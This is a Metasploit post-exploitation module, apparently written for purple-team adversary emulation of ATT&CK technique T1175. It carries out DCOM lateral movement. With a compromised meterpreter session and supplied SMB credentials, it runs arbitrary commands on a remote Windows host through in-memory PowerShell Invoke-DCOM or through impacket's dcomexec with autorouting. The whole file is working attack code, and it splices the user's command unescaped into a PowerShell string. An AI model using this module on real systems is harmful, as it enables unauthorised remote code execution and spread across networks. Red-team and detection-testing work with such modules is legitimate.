##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::File
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
        'Name'          => 'Distributed Component Object Model (T1175) Windows - Purple Team',
        'Description'   => %q{
          Lateral Movement: Windows Distributed Component Object Model (DCOM) is transparent
          middleware that extends the functionality of Component Object Model (COM). beyond a
          local computer using remote procedure call (RPC) technology. COM is a component of
          the Windows application programming interface (API) that enables interaction between
          software objects. Through COM, a client object can call methods of server objects,
          which are typically Dynamic Link Libraries (DLL) or executables (EXE). Permissions
          to interact with local and remote server COM objects are specified by access control
          lists (ACL) in the Registry. By default, only Administrators may remotely activate
          and launch COM objects through DCOM. Adversaries may use DCOM for lateral movement.
          Through DCOM, adversaries operating in the context of an appropriately privileged
          user can remotely obtain arbitrary and even direct shellcode execution through Office applications
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Praetorian' ],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
    ))
    register_options(
    [
      OptEnum.new('METHOD', [ true, 'The DCOM object to use for execution', 'MMC20.Application', ["ShellWindows", "ShellBrowserWindows" ]] ),
      OptAddress.new('RHOST' , [ true, 'Destination IP address.']),
      OptInt.new('SESSION', [ true, 'The session to run this module on.', 1]),
      OptString.new('SMBDOMAIN', [ false, 'The SMB Domain to use', '.']),
      OptString.new('SMBUSER', [ true, 'The SMB User to use']),
      OptString.new('SMBPASS', [ true, 'The SMB Password to use']),
      OptString.new('COMMAND', [ true, 'The command to execute']),
      OptString.new('OUTPUT', [true, 'Get the output of the executed command', true]),
      OptBool.new('POWERSHELL_PIVOT', [true, 'Utilize in memory PowerShell for DCOM execution. This will route through a target session whereas impacket does not.', true])
    ])
    end

    def run_autoroute()
    framework_mod = framework.modules.create('post/multi/manage/autoroute')
    framework_mod.datastore['SESSION'] = datastore['SESSION']
    framework_mod.datastore['VERBOSE'] = datastore['VERBOSE']
    framework_mod.datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
    framework_mod.datastore['SUBNET'] = datastore['RHOST']
    framework_mod.datastore['CMD'] = "add"
    framework_mod.datastore['NETMASK'] = "255.255.255.255"
    framework_mod.run_simple(
      'LocalInput' => self.user_input,
      'LocalOutput' => self.user_output,
      'Quiet' => false,
      'RunAsJob'  => false)
    end

    def run_dcom_exec()
    framework_mod = framework.modules.create('auxiliary/scanner/smb/impacket/dcomexec')
    framework_mod.datastore['RHOSTS'] = datastore['RHOST']
    framework_mod.datastore['COMMAND'] = datastore['COMMAND']
    framework_mod.datastore['SMBDOMAIN'] = datastore['SMBDOMAIN']
    framework_mod.datastore['SMBUSER'] = datastore['SMBUSER']
    framework_mod.datastore['SMBPASS'] = datastore['SMBPASS']
    framework_mod.datastore['VERBOSE'] = datastore['VERBOSE']
    framework_mod.datastore['OBJECT'] = datastore['OBJECT']
    framework_mod.datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
    framework_mod.run_simple(
      'LocalInput' => self.user_input,
      'LocalOutput' => self.user_output,
      'Quiet' => false,
      'RunAsJob'  => false)
    end

    def run

      begin
        if datastore['POWERSHELL_PIVOT']
          print_status("Loading PowerShell")
          client.run_cmd("load powershell")
          print_status("Import Invoke-DCOM")
          client.run_cmd("powershell_import data/purple/t1175/Invoke-DCOM.ps1")
          cmd = "Invoke-DCOM -ComputerName '#{datastore['RHOST']}' -Method #{datastore['METHOD']} -Command '#{datastore['COMMAND']}'"
          print_status("Executing #{cmd} on #{session.inspect}")
          client.run_cmd("powershell_execute '#{cmd}'")
          print_good("Module T1175 execution successful.")
        else
          run_autoroute
          print_status("Executing auxiliary/scanner/smb/impacket/dcomexec on #{session.inspect}")
          run_dcom_exec()
        end
      rescue::Exception => e
        print_error("#{e.class}: #{e.message}")
        print_error("Module T1175 Failed")
      end
    end
    end
